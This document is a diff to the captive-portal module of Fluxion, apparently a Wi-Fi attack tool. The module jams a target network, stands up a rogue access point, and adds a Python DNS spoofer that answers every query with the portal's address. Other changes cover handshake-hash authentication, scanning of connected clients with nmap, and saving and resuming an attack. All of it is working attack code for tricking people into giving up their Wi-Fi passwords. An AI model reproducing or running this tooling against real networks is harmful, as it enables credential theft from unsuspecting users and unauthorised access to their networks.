@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/usr/bin/env bash
 
 # ============================================================ #
 # =============== < Captive Portal Parameters > ============== #
@@ -24,6 +24,8 @@ CaptivePortalGatewayNetwork=${CaptivePortalGatewayAddress%.*}
 # ============== < Captive Portal Subroutines > ============== #
 # ============================================================ #
 captive_portal_unset_jammer_interface() {
+  CaptivePortalJammerInterfaceOriginal=""
+
   if [ ! "$CaptivePortalJammerInterface" ]; then return 1; fi
   CaptivePortalJammerInterface=""
 
@@ -38,19 +40,17 @@ captive_portal_unset_jammer_interface() {
 captive_portal_set_jammer_interface() {
   if [ "$CaptivePortalJammerInterface" ]; then return 0; fi
 
-
-  if [ ! "$CaptivePortalUninitializedJammerInterface" ]; then
+  if [ ! "$CaptivePortalJammerInterfaceOriginal" ]; then
     echo "Running get jammer interface." > $FLUXIONOutputDevice
     if ! fluxion_get_interface attack_targetting_interfaces \
       "$CaptivePortalJammerInterfaceQuery"; then
       echo "Failed to get jammer interface" > $FLUXIONOutputDevice
       return 1
     fi
-    local selectedInterface=$FluxionInterfaceSelected
-  else
-    local selectedInterface=$CaptivePortalUninitializedJammerInterface
-    unset CaptivePortalUninitializedJammerInterface
+    CaptivePortalJammerInterfaceOriginal=$FluxionInterfaceSelected
   fi
+
+  local selectedInterface=$CaptivePortalJammerInterfaceOriginal
 
   if ! fluxion_allocate_interface $selectedInterface; then
     echo "Failed to allocate jammer interface" > $FLUXIONOutputDevice
@@ -71,6 +71,8 @@ captive_portal_ap_interfaces() {
 }
 
 captive_portal_unset_ap_interface() {
+  CaptivePortalAccessPointInterfaceOriginal=""
+
   if [ ! "$CaptivePortalAccessPointInterface" ]; then return 1; fi
   if [ "$CaptivePortalAccessPointInterface" = \
     "${CaptivePortalJammerInterface}v" ]; then
@@ -86,18 +88,17 @@ captive_portal_unset_ap_interface() {
 captive_portal_set_ap_interface() {
   if [ "$CaptivePortalAccessPointInterface" ]; then return 0; fi
 
-  if [ ! "$CaptivePortalUninitializedAccessPointInterface" ]; then
+  if [ ! "$CaptivePortalAccessPointInterfaceOriginal" ]; then
     echo "Running get ap interface." > $FLUXIONOutputDevice
     if ! fluxion_get_interface captive_portal_ap_interfaces \
       "$CaptivePortalAccessPointInterfaceQuery"; then
       echo "Failed to get ap interface" > $FLUXIONOutputDevice
       return 1
     fi
-    local selectedInterface=$FluxionInterfaceSelected
-  else
-    local selectedInterface=$CaptivePortalUninitializedAccessPointInterface
-    unset CaptivePortalUninitializedAccessPointInterface
+    CaptivePortalAccessPointInterfaceOriginal=$FluxionInterfaceSelected
   fi
+
+  local selectedInterface=$CaptivePortalAccessPointInterfaceOriginal
 
   if ! fluxion_allocate_interface $selectedInterface; then
     echo "Failed to allocate ap interface" > $FLUXIONOutputDevice
@@ -140,9 +141,15 @@ function captive_portal_unset_ap_service() {
 }
 
 function captive_portal_set_ap_service() {
-  if [ "$CaptivePortalAPService" ]; then return 0; fi
+  if [ "$CaptivePortalAPService" ]; then
+    if ! type -t ap_service_start; then
+      # AP Service: Load the service's helper routines.
+      source "lib/ap/$CaptivePortalAPService.sh"
+    fi
+    return 0
+  fi
   if ! interface_is_wireless "$CaptivePortalAccessPointInterface"; then
-    return 0;
+    return 0
   fi
 
   captive_portal_unset_ap_service
@@ -205,9 +212,15 @@ captive_portal_unset_authenticator() {
 
 captive_portal_set_authenticator() {
   if [ "$CaptivePortalAuthenticatorMode" ]; then
-    echo "Captive Portal authentication mode is already set, skipping!" \
-      > $FLUXIONOutputDevice
-    return 0
+    case "$CaptivePortalAuthenticatorMode" in
+      "hash")
+        if [ "$CaptivePortalHashPath" ]; then
+          echo "Captive Portal authentication mode is already set, skipping!" \
+            > $FLUXIONOutputDevice
+          return 0
+        fi
+        ;;
+    esac
   fi
 
   captive_portal_unset_authenticator
@@ -277,7 +290,7 @@ captive_portal_set_authenticator() {
 captive_portal_run_certificate_generator() {
   xterm -bg "#000000" -fg "#CCCCCC" \
     -title "Generating Self-Signed SSL Certificate" -e openssl req \
-    -subj '/CN=captive.router.lan/O=CaptivePortal/OU=Networking/C=US' \
+    -subj '/CN=captive.gateway.lan/O=CaptivePortal/OU=Networking/C=US' \
     -new -newkey rsa:2048 -days 365 -nodes -x509 \
     -keyout "$FLUXIONWorkspacePath/server.pem" \
     -out "$FLUXIONWorkspacePath/server.pem"
@@ -299,10 +312,18 @@ captive_portal_unset_certificate() {
 
 # Create Self-Signed SSL Certificate
 captive_portal_set_certificate() {
-  if [ "$CaptivePortalSSL" ]; then
+  if [ \
+      "$CaptivePortalSSL" = "disabled" -o \
+      "$CaptivePortalSSL" = "enabled" -a \
+      -f "$FLUXIONWorkspacePath/server.pem" ]; then
     echo "Captive Portal SSL mode already set to $CaptivePortalSSL!" \
       > $FLUXIONOutputDevice
     return 0
+  fi
+
+  # TODO: This is temporary solution, refactor this.
+  if [ "$CaptivePortalSSL" = "enabled" ]; then
+    local -r restoring=true
   fi
 
   captive_portal_unset_certificate
@@ -322,6 +343,18 @@ captive_portal_set_certificate() {
       > $FLUXIONOutputDevice
     return 0
   fi
+
+
+  # Check if we're restoring and we need to re-create certificate.
+  if [ "$restoring" ]; then
+    if ! captive_portal_run_certificate_generator; then
+      fluxion_conditional_bail "cert-gen failed!"
+      return 2
+    fi
+    CaptivePortalSSL="enabled"
+    return 0
+  fi
+
 
   if [ "$FLUXIONAuto" ]; then
     CaptivePortalSSL="disabled"
@@ -711,49 +744,87 @@ index-file.names = (
 
   # Create a DNS service with python, forwarding all traffic to gateway.
   echo "\
-import socket
+import sys, traceback, socket
+# NOTICE: This DNS server works with python 2 and python 3
 
 class DNSQuery:
   def __init__(self, data):
-    self.data=data
-    self.dominio=''
+    self.data = data
+    self.domain = ''
 
-    tipo = (ord(data[2]) >> 3) & 15
-    if tipo == 0:
-      ini=12
-      lon=ord(data[ini])
-      while lon != 0:
-        self.dominio+=data[ini+1:ini+lon+1]+'.'
-        ini+=lon+1
-        lon=ord(data[ini])
+    queryType = (ord(data[2]) >> 3) & 15
 
-  def respuesta(self, ip):
-    packet=''
-    if self.dominio:
-      packet+=self.data[:2] + \"\x81\x80\"
-      packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'
-      packet+=self.data[12:]
-      packet+='\xc0\x0c'
-      packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
-      packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.')))
+    # Only handle basic requests.
+    if queryType != 0:
+      print('Ignoring Query: Non-spoofed type.')
+      return
+
+    domainStart = 13 # Skip length byte and start at domain.
+    domainLength = ord(data[domainStart - 1]) # Evaluate length byte.
+
+    while domainLength != 0:
+      self.domain += data[domainStart : domainStart + domainLength] + '.'
+
+      domainStart += domainLength + 1 # Skip the length byte & start at domain.
+      domainLength = ord(data[domainStart - 1]) # Evaluate length byte.
+
+  def response(self, ipv4):
+    if not self.domain: return ''
+
+    packet = ''
+
+    packet += self.data[ :2] + '\x81\x80'
+    packet += self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'
+    packet += self.data[12:]
+    packet += '\xc0\x0c'
+    packet += '\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
+
+    # Convert string IPv4 quads to binary values (bytes).
+    packet += str.join('', map(lambda s: chr(int(s)), ipv4.split('.')))
+
     return packet
 
 if __name__ == '__main__':
-  ip='$CaptivePortalGatewayAddress'
-  print 'pyminifakeDwebconfNS:: dom.query. 60 IN A %s' % ip
+  targetIPv4 = '$CaptivePortalGatewayAddress'
 
-  udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-  udps.bind(('',53))
+  print('Mini DNS Spoofer:: dom.query. 60 IN A %s' % targetIPv4)
+
+  link = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+  link.bind(('',53))
 
   try:
-    while 1:
-      data, addr = udps.recvfrom(1024)
-      p=DNSQuery(data)
-      udps.sendto(p.respuesta(ip), addr)
-      print 'Request: %s -> %s' % (p.dominio, ip)
+    while True:
+      clientData, clientIPv4 = link.recvfrom(1024)
+
+      queryData = clientData if sys.version_info < (3, 0) else clientData.decode('unicode_escape')
+
+      query = DNSQuery(queryData)
+
+      response = query.response(targetIPv4)
+
+      if sys.version_info > (3, 0):
+        # Someone that knows more about python and how it does byte-handling,
+        # please fix the following shitfest and make it a bit more elegant.
+        # Do what? A raw conversion of the \"response\" string to bytes.
+        responseHex = ''
+        for xx in response:
+          responseHex += \"%x%x\" % ((ord(xx) >> 4) & 0b1111, ord(xx) & 0b1111)
+
+        response = bytearray.fromhex(responseHex)
+
+      link.sendto(response, clientIPv4)
+
+      print('Request: %s -> %s' % (query.domain, targetIPv4))
+
   except KeyboardInterrupt:
-    print 'Finalizando'
-    udps.close()\
+    print('INTERRUPT: Stopping.')
+    link.close()
+
+  except Exception as error:
+    print('EXCEPTION: Stopping!')
+    print(error)
+    print(traceback.format_exc())
+    link.close()
 " >"$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py"
 
   chmod +x "$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py"
@@ -761,7 +832,7 @@ if __name__ == '__main__':
   local -r targetSSIDCleanNormalized=${FluxionTargetSSIDClean//"/\\"}
   # Attack arbiter script
   echo "\
-#!/bin/bash
+#!/usr/bin/env bash
 
 signal_stop_attack() {
 	kill -s SIGABRT $$ # Signal STOP ATTACK
@@ -864,7 +935,7 @@ while [ \$AuthenticatorState = \"running\" ]; do
 
   local -r staticSSID=$(printf "%q" "$FluxionTargetSSID" | sed -r 's/\\\ / /g' | sed -r "s/\\\'/\'/g")
   echo "
-	DHCPClients=($(nmap -PR -sn -n -oG - $CaptivePortalGatewayNetwork.100-110 2>&1 | grep Host))
+	readarray -t DHCPClients < <(nmap -PR -sn -n -oG - $CaptivePortalGatewayNetwork.100-110 2>&1 | grep Host)
 
 	echo
 	echo -e \"  ACCESS POINT:\"
@@ -1183,9 +1254,9 @@ fi
 while [ "$1" != "" -a "$1" != "--" ]; do
   case "$1" in
     -a|--ap)
-      CaptivePortalUninitializedAccessPointInterface=$2; shift;;
+      CaptivePortalAccessPointInterfaceOriginal=$2; shift;;
     -j|--jammer)
-      CaptivePortalUninitializedJammerInterface=$2; shift;;
+      CaptivePortalJammerInterfaceOriginal=$2; shift;;
     -s|--ssl)
       CaptivePortalSSLCertificatePath=$2; shift;;
     -c|--connectivity)
@@ -1250,6 +1321,57 @@ prep_attack() {
   fi
 
   CaptivePortalState="Ready"
+}
+
+load_attack() {
+  local -r configurationPath=$1
+
+  local configuration
+  readarray -t configuration < <(more "$configurationPath")
+
+  CaptivePortalJammerInterfaceOriginal=${configuration[0]}
+  CaptivePortalAccessPointInterfaceOriginal=${configuration[1]}
+  CaptivePortalAPService=${configuration[2]}
+  CaptivePortalAuthenticatorMode=${configuration[3]}
+  CaptivePortalSSL=${configuration[4]}
+  CaptivePortalConnectivity=${configuration[5]}
+  CaptivePortalUserInterface=${configuration[6]}
+
+  # Hash authenticator mode configuration.
+  CaptivePortalHashPath=${configuration[7]}
+
+  # Target hash information for verification.
+  local -r targetHashSSID=${configuration[8]}
+  local -r targetHashMAC=${configuration[9]}
+
+  # Assure hash is relevant for fluxion's current target.
+  # If the hash is no longer relevant, clear to force reset.
+  if [ \
+    "$targetHashSSID" != "$FluxionTargetSSID" -o \
+    "$targetHashMAC" != "$FluxionTargetMAC" ]; then
+    CaptivePortalHashPath=""
+  fi
+}
+
+save_attack() {
+  local -r configurationPath=$1
+
+  # Store/overwrite attack configuration for pause & resume.
+  # Order: JammerWI, APWI, APServ, AuthMode, SSL, Conn, UI
+  echo "$CaptivePortalJammerInterfaceOriginal" > "$configurationPath"
+  echo "$CaptivePortalAccessPointInterfaceOriginal" >> "$configurationPath"
+  echo "$CaptivePortalAPService" >> "$configurationPath"
+  echo "$CaptivePortalAuthenticatorMode" >> "$configurationPath"
+  echo "$CaptivePortalSSL" >> "$configurationPath"
+  echo "$CaptivePortalConnectivity" >> "$configurationPath"
+  echo "$CaptivePortalUserInterface" >> "$configurationPath"
+
+  # Hash authenticator mode configuration.
+  echo "$CaptivePortalHashPath" >> "$configurationPath"
+
+  # Target to verify validity of hash on restore.
+  echo "$FluxionTargetSSID" >> "$configurationPath"
+  echo "$FluxionTargetMAC" >> "$configurationPath"
 }
 
 stop_attack() {
